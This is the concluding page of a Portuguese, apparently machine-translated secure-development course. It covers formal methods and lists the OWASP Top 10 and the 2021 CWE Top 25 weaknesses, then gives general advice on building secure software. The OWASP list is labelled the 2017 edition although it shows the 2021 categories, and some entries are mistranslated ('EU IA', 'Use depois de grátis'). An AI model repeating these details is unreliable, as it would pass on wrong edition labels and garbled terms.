de especificação formal de propósito geral que é particularmente útil para descrever sistemas concorrentes e distribuídos, e tem uma variedade de ferramentas de suporte.</li> </ul> <h1 id=metodos-formais-e-o-futuro>Métodos formais e o futuro<a class=headerlink href=#metodos-formais-e-o-futuro title="Permanent link">¶</a></h1> <p>Hoje em dia, os métodos formais são usados ​​apenas em circunstâncias especiais, mas podem se tornar mais populares no futuro. Nosso objetivo é simplesmente informá-lo sobre isso, caso você decida que vale a pena aprofundá-los no futuro. Você não pode considerar usar uma abordagem se nunca ouviu falar dela.</p> <h1 id=owasp-top-10>OWASP Top 10<a class=headerlink href=#owasp-top-10 title="Permanent link">¶</a></h1> <p>Observamos anteriormente que há duas listas amplamente utilizadas de vulnerabilidades "principais", a OWASP Top 10 (com foco em riscos de segurança de aplicativos web) e a CWE Top 25. Elas identificam o que consideram os itens "principais" em termos de serem especialmente comuns e especialmente perigosos.</p> <p>Seus diferentes escopos resultam em muitas diferenças. Por exemplo, o CWE Top 25 lista estouros de buffer, enquanto o OWASP Top 10 não, porque estouros de buffer são um problema sério comum em alguns domínios (como sistemas embarcados), mas não são comuns em aplicações web.</p> <p>Aqui está a lista das <a href=https://owasp.org/Top10/ ><em>10 principais</em></a> <a href=https://owasp.org/Top10/ >categorias da OWASP</a> (edição de 2017):</p> <ol> <li>Controle de acesso quebrado</li> <li>Falhas Criptográficas</li> <li>Injeção</li> <li>Design Inseguro</li> <li>Configuração incorreta de segurança</li> <li>Componentes vulneráveis ​​e desatualizados</li> <li>Falhas de Identificação e Autenticação</li> <li>Falhas de software e integridade de dados</li> <li>Falhas de monitoramento e registro de segurança</li> <li>Falsificação de solicitação do lado do servidor (SSRF)</li> </ol> <p>Neste curso, abordamos todos os 10 principais OWASP, nas edições de <a href=https://owasp.org/www-project-top-ten/2017/Top_10>2017</a> e <a href=https://owasp.org/Top10/ >2021</a> , e incluímos referências cruzadas quando o fizemos.</p> <h1 id=cwe-top-25>CWE Top 25<a class=headerlink href=#cwe-top-25 title="Permanent link">¶</a></h1> <p>Esta é a edição de 2021 do <a href=https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html>CWE Top 25 Most Dangerous Software Errors</a> . Esta lista foi criada usando dados do mundo real, especificamente as vulnerabilidades publicamente conhecidas com Vulnerabilidades e Exposições Comuns (CVE), conforme publicadas no Banco de Dados Nacional de Vulnerabilidades (NVD) do Instituto Nacional de Padrões e Tecnologia (NIST), incluindo as pontuações de gravidade calculadas usando as pontuações do Sistema Comum de Pontuação de Vulnerabilidades (CVSS). Esta lista combina muitos tipos diferentes de software; se isso é bom ou não depende da sua perspectiva.</p> <p>Nenhum sistema é perfeito. Uma complicação é que os CWEs identificados aqui estão em vários níveis hierárquicos. Por exemplo, <a href=https://cwe.mitre.org/data/definitions/119.html>o CWE-119</a> nº 17 ( <em>Restrição Imprópria de Operações dentro dos Limites de um Buffer de Memória ) é um superconjunto do</em> <a href=https://cwe.mitre.org/data/definitions/125.html>CWE-125</a> nº 3 ( <em>Leitura Fora dos Limites</em> ) e <a href=https://cwe.mitre.org/data/definitions/787.html>do CWE-787</a> nº 1 ( <em>Escrita Fora dos Limites</em> ), mas todos estão listados aqui. Ainda assim, isso fornece uma abordagem defensável e repetível para identificar o que é importante.</p> <p>Tabela: CWE Top 25</p> <table> <thead> <tr> <th>Classificação</th> <th>EU IA</th> <th>Nome</th> </tr> </thead> <tbody> <tr> <td>[1]</td> <td><a href=https://cwe.mitre.org/data/definitions/787.html>CWE-787</a></td> <td>Gravação fora dos limites</td> </tr> <tr> <td>[2]</td> <td><a href=https://cwe.mitre.org/data/definitions/79.html>CWE-79</a></td> <td>Neutralização imprópria de entrada durante a geração de páginas da web ('Cross-site Scripting')</td> </tr> <tr> <td>[3]</td> <td><a href=https://cwe.mitre.org/data/definitions/125.html>CWE-125</a></td> <td>Leitura fora dos limites</td> </tr> <tr> <td>[4]</td> <td><a href=https://cwe.mitre.org/data/definitions/20.html>CWE-20</a></td> <td>Validação de entrada inadequada</td> </tr> <tr> <td>[5]</td> <td><a href=https://cwe.mitre.org/data/definitions/78.html>CWE-78</a></td> <td>Neutralização imprópria de elementos especiais usados ​​em um comando do sistema operacional ('injeção de comando do sistema operacional')</td> </tr> <tr> <td>[6]</td> <td><a href=https://cwe.mitre.org/data/definitions/89.html>CWE-89</a></td> <td>Neutralização imprópria de elementos especiais usados ​​em um comando SQL ('injeção de SQL')</td> </tr> <tr> <td>[7]</td> <td><a href=https://cwe.mitre.org/data/definitions/416.html>CWE-416</a></td> <td>Use depois de grátis</td> </tr> <tr> <td>[8]</td> <td><a href=https://cwe.mitre.org/data/definitions/22.html>CWE-22</a></td> <td>Limitação imprópria de um nome de caminho para um diretório restrito ('Travessia de caminho')</td> </tr> <tr> <td>[9]</td> <td><a href=https://cwe.mitre.org/data/definitions/352.html>CWE-352</a></td> <td>Falsificação de solicitação entre sites (CSRF)</td> </tr> <tr> <td>[10]</td> <td><a href=https://cwe.mitre.org/data/definitions/434.html>CWE-434</a></td> <td>Upload irrestrito de arquivo com tipo perigoso</td> </tr> <tr> <td>[11]</td> <td><a href=https://cwe.mitre.org/data/definitions/306.html>CWE-306</a></td> <td>Autenticação ausente de função crítica</td> </tr> <tr> <td>[12]</td> <td><a href=https://cwe.mitre.org/data/definitions/190.html>CWE-190</a></td> <td>Estouro de inteiro ou wraparound</td> </tr> <tr> <td>[13]</td> <td><a href=https://cwe.mitre.org/data/definitions/502.html>CWE-502</a></td> <td>Desserialização de dados não confiáveis</td> </tr> <tr> <td>[14]</td> <td><a href=https://cwe.mitre.org/data/definitions/287.html>CWE-287</a></td> <td>Autenticação imprópria</td> </tr> <tr> <td>[15]</td> <td><a href=https://cwe.mitre.org/data/definitions/476.html>CWE-476</a></td> <td>Desreferência de ponteiro NULL</td> </tr> <tr> <td>[16]</td> <td><a href=https://cwe.mitre.org/data/definitions/798.html>CWE-798</a></td> <td>Uso de credenciais codificadas</td> </tr> <tr> <td>[17]</td> <td><a href=https://cwe.mitre.org/data/definitions/119.html>CWE-119</a></td> <td>Restrição imprópria de operações dentro dos limites de um buffer de memória</td> </tr> <tr> <td>[18]</td> <td><a href=https://cwe.mitre.org/data/definitions/862.html>CWE-862</a></td> <td>Autorização Faltante</td> </tr> <tr> <td>[19]</td> <td><a href=https://cwe.mitre.org/data/definitions/276.html>CWE-276</a></td> <td>Permissões padrão incorretas</td> </tr> <tr> <td>[20]</td> <td><a href=https://cwe.mitre.org/data/definitions/200.html>CWE-200</a></td> <td>Exposição de informações confidenciais a um ator não autorizado</td> </tr> <tr> <td>[21]</td> <td><a href=https://cwe.mitre.org/data/definitions/522.html>CWE-522</a></td> <td>Credenciais insuficientemente protegidas</td> </tr> <tr> <td>[22]</td> <td><a href=https://cwe.mitre.org/data/definitions/732.html>CWE-732</a></td> <td>Atribuição de permissão incorreta para recurso crítico</td> </tr> <tr> <td>[23]</td> <td><a href=https://cwe.mitre.org/data/definitions/611.html>CWE-611</a></td> <td>Restrição imprópria de referência de entidade externa XML</td> </tr> <tr> <td>[24]</td> <td><a href=https://cwe.mitre.org/data/definitions/918.html>CWE-918</a></td> <td>Falsificação de solicitação do lado do servidor (SSRF)</td> </tr> <tr> <td>[25]</td> <td><a href=https://cwe.mitre.org/data/definitions/77.html>CWE-77</a></td> <td>Neutralização imprópria de elementos especiais usados ​​em um comando ('injeção de comando')</td> </tr> </tbody> </table> <h2 id=on-the-cusp>On the Cusp<a class=headerlink href=#on-the-cusp title="Permanent link">¶</a></h2> <p>Os desenvolvedores do CWE Top 25 consideraram que havia uma série de fraquezas importantes, mas que não conseguiram figurar entre as 25 principais por não serem tão prevalentes ou tenderem a ser menos graves. Eles chamam essas fraquezas <em>de "na cúspide"</em> .</p> <p>Desenvolvedores que concluírem a mitigação e a tomada de decisões de risco no CWE Top 25 de 2021 podem querer procurar outras fraquezas potencialmente presentes em seus softwares. Por esses motivos, os usuários do CWE Top 25 de 2021 devem considerar seriamente incluir estas fraquezas adicionais em suas análises:</p> <p>Tabela: CWE Top 25 à beira do precipício</p> <table> <thead> <tr> <th>Classificação</th> <th>EU IA</th> <th>Nome</th> </tr> </thead> <tbody> <tr> <td>[26]</td> <td><a href=https://cwe.mitre.org/data/definitions/295.html>CWE-295</a></td> <td>Validação de certificado inadequada</td> </tr> <tr> <td>[27]</td> <td><a href=https://cwe.mitre.org/data/definitions/400.html>CWE-400</a></td> <td>Consumo descontrolado de recursos</td> </tr> <tr> <td>[28]</td> <td><a href=https://cwe.mitre.org/data/definitions/94.html>CWE-94</a></td> <td>Controle impróprio de geração de código ('Injeção de código')</td> </tr> <tr> <td>[29]</td> <td><a href=https://cwe.mitre.org/data/definitions/269.html>CWE-269</a></td> <td>Gerenciamento de privilégios impróprio</td> </tr> <tr> <td>[30]</td> <td><a href=https://cwe.mitre.org/data/definitions/917.html>CWE-917</a></td> <td>Neutralização imprópria de elementos especiais usados ​​em uma declaração de linguagem de expressão ('injeção de linguagem de expressão')</td> </tr> <tr> <td>[31]</td> <td><a href=https://cwe.mitre.org/data/definitions/59.html>CWE-59</a></td> <td>Resolução de link imprópria antes do acesso ao arquivo ('Link Following')</td> </tr> <tr> <td>[32]</td> <td><a href=https://cwe.mitre.org/data/definitions/401.html>CWE-401</a></td> <td>Liberação de memória ausente após tempo de vida efetivo</td> </tr> <tr> <td>[33]</td> <td><a href=https://cwe.mitre.org/data/definitions/362.html>CWE-362</a></td> <td>Execução simultânea usando recurso compartilhado com sincronização inadequada ('condição de corrida')</td> </tr> <tr> <td>[34]</td> <td><a href=https://cwe.mitre.org/data/definitions/427.html>CWE-427</a></td> <td>Elemento de caminho de pesquisa não controlado</td> </tr> <tr> <td>[35]</td> <td><a href=https://cwe.mitre.org/data/definitions/319.html>CWE-319</a></td> <td>Transmissão de informações confidenciais em texto simples</td> </tr> <tr> <td>[36]</td> <td><a href=https://cwe.mitre.org/data/definitions/843.html>CWE-843</a></td> <td>Acesso a recursos usando tipo incompatível ('confusão de tipos')</td> </tr> <tr> <td>[37]</td> <td><a href=https://cwe.mitre.org/data/definitions/601.html>CWE-601</a></td> <td>Redirecionamento de URL para site não confiável (redirecionamento aberto)</td> </tr> <tr> <td>[38]</td> <td><a href=https://cwe.mitre.org/data/definitions/863.html>CWE-863</a></td> <td>Autorização Incorreta</td> </tr> <tr> <td>[39]</td> <td><a href=https://cwe.mitre.org/data/definitions/532.html>CWE-532</a></td> <td>Inclusão de informações sensíveis em arquivos de log</td> </tr> <tr> <td>[40]</td> <td><a href=https://cwe.mitre.org/data/definitions/770.html>CWE-770</a></td> <td>Alocação de recursos sem limites ou estrangulamentos</td> </tr> </tbody> </table> <p>Você ficará feliz em saber que este curso discutiu, pelo menos brevemente, cada um desses tipos de vulnerabilidades, mesmo aquelas "no limite", para as edições de <a href=https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html>2019</a> e <a href=https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html>2021</a> da lista CWE Top 25.</p> <h1 id=conclusoes>Conclusões<a class=headerlink href=#conclusoes title="Permanent link">¶</a></h1> <p>O objetivo deste curso é ajudar você a desenvolver software seguro. Esperamos que você se sinta muito mais preparado para combater invasores.</p> <p>À medida que você desenvolve seu software:</p> <ul> <li>Considere seus requisitos de segurança. Certifique-se de saber o que ele deve fazer... e o <em>que NÃO deve</em> fazer.</li> <li>Projete para segurança. Considere constantemente princípios de design, como privilégio mínimo e não-ignorabilidade.</li> <li>Implemente para segurança. Em particular, combata os tipos comuns de erros. Simplesmente combater os tipos comuns de vulnerabilidades não é suficiente para criar um sistema seguro, mas já é um grande passo à frente. Conhecer os tipos comuns de erros de implementação também ajudará você a se conscientizar de outros tipos de vulnerabilidades.</li> <li>Verifique. Em particular, use ferramentas para detectar problemas <em>antes</em> do lançamento. Sempre que possível, habilite as ferramentas o mais rápido possível e certifique-se de que elas estejam no seu pipeline de integração contínua (CI).</li> <li>Receber e processar prontamente relatórios de vulnerabilidade.</li> </ul> <p>Na vida real, a segurança é um processo — uma jornada — e não um simples ponto final. Esperamos que os cursos deste programa de certificação profissional tenham deixado você muito mais preparado para essa jornada. Desejamos a você tudo de bom no desenvolvimento de softwares que ajudarão a proteger a reputação, a propriedade e até mesmo a vida das pessoas.</p> <aside class=md-source-file> <span class=md-source-file__fact> <span class=md-icon title="Last update"> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class=timeago datetime=2025-05-27T05:35:21-03:00 locale=pt></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-05-27</span> </span> <span class=md-source-file__fact> <span class=md-icon title=Created> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class=timeago datetime=2025-05-27T05:35:21-03:00 locale=pt></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-05-27</span> </span> <span class=md-source-file__fact> <span class=md-icon title=Contributors> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M12 4a4 4 0 0 1 4 4 4 4 0 0 1-4 4 4 4 0 0 1-4-4 4 4 0 0 1 4-4m0 10c4.42 0 8 1.79 8 4v2H4v-2c0-2.21 3.58-4 8-4"></path></svg> </span> <nav> <a href=mailto:not.committed.yet>Not Committed Yet</a> </nav> </span> </aside> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright © 2024 Documentação <a href=#__consent>Change cookie settings</a> </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ rel=noopener target=_blank> Material for MkDocs </a> </div> <div class=md-social> <a class=md-social__link href=https://github.com/horaciovasconcellos rel=noopener target=_blank title=github.com> <svg viewbox="0 0 496 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg> </a> <a class=md-social__link href=https://gitlab.com/horaciovasconcellos rel=noopener target=_blank title=gitlab.com> <svg viewbox="0 0 512 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="m503.5 204.6-.7-1.8-69.7-181.78c-1.4-3.57-3.9-6.59-7.2-8.64-2.4-1.55-5.1-2.515-8-2.81s-5.7.083-8.4 1.11c-2.7 1.02-5.1 2.66-7.1 4.78-1.9 2.12-3.3 4.67-4.1 7.44l-47 144H160.8l-47.1-144c-.8-2.77-2.2-5.31-4.1-7.43-2-2.12-4.4-3.75-7.1-4.77a18.1 18.1 0 0 0-8.38-1.113 18.4 18.4 0 0 0-8.04 2.793 18.1 18.1 0 0 0-7.16 8.64L9.267 202.8l-.724 1.8a129.57 129.57 0 0 0-3.52 82c7.747 26.9 24.047 50.7 46.447 67.6l.27.2.59.4 105.97 79.5 52.6 39.7 32 24.2c3.7 1.9 8.3 4.3 13 4.3s9.3-2.4 13-4.3l32-24.2 52.6-39.7 106.7-79.9.3-.3c22.4-16.9 38.7-40.6 45.6-67.5 8.6-27 7.4-55.8-2.6-82"></path></svg> </a> <a class=md-social__link href=https://twitter.com/Horacio_Junior rel=noopener target=_blank title="Horacio.Vasconcellos on Twitter"> <svg viewbox="0 0 512 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"></path></svg> </a> <a class=md-social__link href rel="noopener me" target=_blank title="Horaci.Vasconcellos on Mastodon"> <svg viewbox="0 0 448 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.5 102.5 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5m-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"></path></svg> </a> <a class=md-social__link href=https://gitter.im/squidfunk/mkdocs-material rel=noopener target=_blank title=gitter.im> <svg viewbox="0 0 384 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M66.4 322.5H16V0h50.4zM166.9 76.1h-50.4V512h50.4zm100.6 0h-50.4V512h50.4zM368 76h-50.4v247H368z"></path></svg> </a> <a class=md-social__link href=https://hub.docker.com/u/77678117787 rel=noopener target=_blank title=hub.docker.com> <svg viewbox="0 0 640 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M349.9 236.3h-66.1v-59.4h66.1zm0-204.3h-66.1v60.7h66.1zm78.2 144.8H362v59.4h66.1zm-156.3-72.1h-66.1v60.1h66.1zm78.1 0h-66.1v60.1h66.1zm276.8 100c-14.4-9.7-47.6-13.2-73.1-8.4-3.3-24-16.7-44.9-41.1-63.7l-14-9.3-9.3 14c-18.4 27.8-23.4 73.6-3.7 103.8-8.7 4.7-25.8 11.1-48.4 10.7H2.4c-8.7 50.8 5.8 116.8 44 162.1 37.1 43.9 92.7 66.2 165.4 66.2 157.4 0 273.9-72.5 328.4-204.2 21.4.4 67.6.1 91.3-45.2 1.5-2.5 6.6-13.2 8.5-17.1zm-511.1-27.9h-66v59.4h66.1v-59.4zm78.1 0h-66.1v59.4h66.1zm78.1 0h-66.1v59.4h66.1zm-78.1-72.1h-66.1v60.1h66.1z"></path></svg> </a> <a class=md-social__link href=https://www.linkedin.com/in/hor%C3%A1cio-correa-t-de-vasconcellos-j%C3%BAnior-b7788467/ rel=noopener target=_blank title=www.linkedin.com> <svg viewbox="0 0 448 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path></svg> </a> <a class=md-social__link href=https://www.instagram.com/horacio.vasconcellos/ rel=noopener target=_blank title=www.instagram.com> <svg viewbox="0 0 448 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141m0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7m146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8m76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8M398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1"></path></svg> </a> <a class=md-social__link href=https://www.facebook.com/horacio.vasconcellos rel=noopener target=_blank title=www.facebook.com> <svg viewbox="0 0 512 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M512 256C512 114.6 397.4 0 256 0S0 114.6 0 256c0 120 82.7 220.8 194.2 248.5V334.2h-52.8V256h52.8v-33.7c0-87.1 39.4-127.5 125-127.5 16.2 0 44.2 3.2 55.7 6.4V172c-6-.6-16.5-1-29.6-1-42 0-58.2 15.9-58.2 57.2V256h83.6l-14.4 78.2H287v175.9C413.8 494.8 512 386.9 512 256"></path></svg> </a> <a class=md-social__link href=http://60pportunities.com.br rel=noopener target=_blank title=60pportunities.com.br> <svg viewbox="0 0 640 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M180.5 74.262C80.813 74.262 0 155.633 0 256s80.819 181.738 180.5 181.738S361 356.373 361 256 280.191 74.262 180.5 74.262m288.25 10.646c-49.845 0-90.245 76.619-90.245 171.095s40.406 171.1 90.251 171.1 90.251-76.619 90.251-171.1H559c0-94.503-40.4-171.095-90.248-171.095Zm139.506 17.821c-17.526 0-31.735 68.628-31.735 153.274s14.2 153.274 31.735 153.274S640 340.631 640 256c0-84.649-14.215-153.271-31.742-153.271Z"></path></svg> </a> <a class=md-social__link href=https://60pportunities.com.br rel=noopener target=_blank title=60pportunities.com.br> <svg viewbox="0 0 576 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M244 246c-3.2-2-6.3-2.9-10.1-2.9-6.6 0-12.6 3.2-19.3 3.7l1.7 4.9zm135.9 197.9c-19 0-64.1 9.5-79.9 19.8l6.9 45.1c35.7 6.1 70.1 3.6 106-9.8-4.8-10-23.5-55.1-33-55.1M340.8 177c6.6 2.8 11.5 9.2 22.7 22.1 2-1.4 7.5-5.2 7.5-8.6 0-4.9-11.8-13.2-13.2-23 11.2-5.7 25.2-6 37.6-8.9 68.1-16.4 116.3-52.9 146.8-116.7C548.3 29.3 554 16.1 554.6 2l-2 2.6c-28.4 50-33 63.2-81.3 100-31.9 24.4-69.2 40.2-106.6 54.6l-6.3-.3v-21.8c-19.6 1.6-19.7-14.6-31.6-23-18.7 20.6-31.6 40.8-58.9 51.1-12.7 4.8-19.6 10-25.9 21.8 34.9-16.4 91.2-13.5 98.8-10M555.5 0l-.6 1.1-.3.9.6-.6zm-59.2 382.1c-33.9-56.9-75.3-118.4-150-115.5l-.3-6c-1.1-13.5 32.8 3.2 35.1-31l-14.4 7.2c-19.8-45.7-8.6-54.3-65.5-54.3-14.7 0-26.7 1.7-41.4 4.6 2.9 18.6 2.2 